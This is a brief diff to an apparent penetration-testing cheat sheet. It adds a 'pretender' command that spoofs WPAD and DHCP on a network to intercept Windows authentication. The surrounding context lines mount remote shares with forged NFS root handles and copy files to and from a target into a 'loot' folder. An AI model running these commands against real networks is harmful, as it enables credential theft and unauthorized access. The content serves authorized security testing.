@@ -22,3 +22,4 @@ mount -t cifs -o username="$USER",password="$PASSWORD" //"$TARGET"/"$SHARE" /wor
 fuse_nfs --manual-fh "$ROOT_FILE_HANDLE" --fake-uid --fake-uid-allow-root /workspace/mount/ "$TARGET"  # The "$ROOT_FILE_HANDLE" can be obtained using the "nfs_analyze" tool
 scp "$USER"@"$TARGET":"$REMOTE_FILE" /workspace/loot/ # Download a file
 scp "$LOCAL_FILE" "$USER"@"$TARGET":"$REMOTE_FOLDER"  # Upload a file
+pretender -i "$INTERFACE" --delegate-ignored-to "$DC_HOST" --no-lnr --ignore-non-microsoft-dhcp --spoof "wpad.*" -l "/workspace/output/pretender.txt"
